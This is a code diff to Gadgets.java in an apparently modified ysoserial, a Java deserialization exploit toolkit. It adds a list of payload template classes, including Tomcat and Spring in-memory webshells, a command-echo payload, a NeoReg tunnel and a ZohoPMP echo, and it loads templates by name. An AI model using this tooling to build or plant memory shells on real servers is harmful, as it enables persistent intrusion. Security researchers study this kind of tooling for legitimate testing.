@@ -14,8 +14,6 @@ import javassist.CtClass;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang.RandomStringUtils;
 import org.apache.wicket.util.file.Files;
-import ysoserial.payloads.templates.SpringInterceptorMemShell;
-
 import javax.net.ssl.HttpsURLConnection;
 import java.io.*;
 import java.lang.reflect.Array;
@@ -26,6 +24,7 @@ import java.net.URL;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.zip.GZIPOutputStream;
+import ysoserial.payloads.templates.SpringInterceptorMemShell;
 import ysoserial.payloads.templates.ClassLoaderTemplate;
 import ysoserial.payloads.templates.CommandTemplate;
 import ysoserial.payloads.templates.ScriptEngineTemplate;
@@ -98,6 +97,20 @@ public class Gadgets {
             transFactory = TransformerFactoryImpl.class;
         }
 
+        Class []xx = new Class[]{ysoserial.payloads.templates.SpringInterceptorMemShell.class,
+            ysoserial.payloads.templates.ClassLoaderTemplate.class,
+            ysoserial.payloads.templates.CommandTemplate.class,
+            ysoserial.payloads.templates.ScriptEngineTemplate.class,
+            ysoserial.payloads.templates.SpringInterceptorTemplate.class,
+            ysoserial.payloads.templates.TomcatCmdEcho.class,
+            ysoserial.payloads.templates.TomcatFilterMemShellFromJMX.class,
+            ysoserial.payloads.templates.TomcatFilterMemShellFromThread.class,
+            ysoserial.payloads.templates.TomcatListenerMemShellFromJMX.class,
+            ysoserial.payloads.templates.TomcatListenerMemShellFromThread.class,
+            ysoserial.payloads.templates.TomcatListenerNeoRegFromThread.class,
+            ysoserial.payloads.templates.TomcatServletMemShellFromJMX.class,
+            ysoserial.payloads.templates.TomcatServletMemShellFromThread.class,
+            ysoserial.payloads.templates.ZohoPMPTomcatEcho.class};
         if (command.startsWith("CLASS:")) {
             // 这里不能让它初始化，不然从线程中获取WebappClassLoaderBase时会强制类型转换异常。
             Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Gadgets.class.getClassLoader());
